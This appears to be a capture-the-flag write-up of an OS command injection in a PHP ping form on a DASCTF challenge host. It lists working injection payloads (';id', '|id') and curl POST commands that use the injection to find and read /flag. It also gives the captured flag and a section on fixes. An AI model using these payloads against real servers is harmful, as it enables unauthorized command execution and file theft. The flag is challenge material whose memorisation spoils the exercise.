# Attack Report — dasctf-cmdexec

**Generated:** 2026-07-17 01:30:17
**Target:** http://238c5573cd0ac949580fda44.http-ctf2.dasctf.com:80

## Target Summary

- **URL/IP:** http://238c5573cd0ac949580fda44.http-ctf2.dasctf.com:80
- **Technologies detected:**
  - Bootstrap 3.0.3
  - OpenResty (nginx + Lua)
  - PHP 7.3.13
- **Key HTTP headers:**
  - `Server: openresty`
  - `X-Powered-By: PHP/7.3.13`

## Vulnerability Discovered

- **Type:** OS Command Injection (CMDi)
- **Location:** POST parameter `target` at `/` (index page)
- **How it was found:** Manual review of the index page HTML revealed a PING form with a `target` input field and the page title "command execution" — a strong hint. Sending a normal ping value (`127.0.0.1`) confirmed the backend calls the system `ping` command. Injecting `;id` after the IP confirmed arbitrary command execution.

## Exploitation Chain

**Step 1 — Recon:** `curl -s http://target:80` saved to `recon/index-source.html`. The HTML showed a `<form method="post">` with `<input name="target">` and title "command execution". The page clearly passes user input to a ping command on the server.

**Step 2 — Confirm normal behavior:** Sent `target=127.0.0.1` via POST. Response contained valid ping output — confirmed the parameter reaches a system shell.

**Step 3 — Test command injection separators:**

| Payload | Separator | Result |
|---------|-----------|--------|
| `127.0.0.1;id` | `;` | WORKS — ping output + `uid=82(www-data)` |
| `127.0.0.1\|id` | `\|` | WORKS — only `id` output (ping stdout piped away) |
| `127.0.0.1&&id` | `&&` | FAILED — only ping output, no id |

Both `;` and `|` are effective injection vectors. The user runs as `www-data`.

**Step 4 — Locate the flag:**
```
curl -X POST <target> -d "target=127.0.0.1;find / -name '*flag*' 2>/dev/null"
```
Output revealed `/flag` at the filesystem root.

**Step 5 — Read the flag:**
```
curl -X POST <target> -d "target=127.0.0.1;cat /flag"
```
Output: `CTF2{03bb6e97-c624-4662-afdf-f66037cc6235}`

## Flag(s) Captured

| Flag | Location | Method |
|------|----------|--------|
| `CTF2{03bb6e97-c624-4662-afdf-f66037cc6235}` | `/flag` on target | `;cat /flag` via POST command injection |

## Lessons Learned

- **Root cause:** The PHP backend directly interpolates user input into a shell command without any sanitization or escaping. The pattern is likely: `shell_exec("ping -c 3 " . $_POST['target'])`.
- **Defense:** Use `escapeshellarg()` on the parameter before passing it to `shell_exec()`, or better, avoid shell commands entirely and use PHP's native networking functions. Input validation against an allowlist (e.g., only IP address regex) would also block injection.
- **Dead ends:** The `&&` chaining operator did not produce `id` output — the ping may have returned non-zero when used with `&&`, or the shell may have some filtering. In any case, `;` and `|` both worked reliably.

## Files Saved

### recon/
- `headers.txt` (9 lines) — HTTP response headers
- `index-source.html` (26 lines) — Full page HTML with PING form
- `whatweb.txt` (54 lines) — Technology fingerprint output

### exploits/
- `cmdi-normal.txt` — Baseline: normal `ping 127.0.0.1` response
- `cmdi-semicolon.txt` — Successful `;id` injection (ping + id output)
- `cmdi-pipe.txt` — Successful `|id` injection (id output only)
- `cmdi-and.txt` — Failed `&&id` injection (only ping output)

### flags/
- `flag.txt` — Extracted flag value
- `found-flags.txt` — Automated find-flag.sh search results
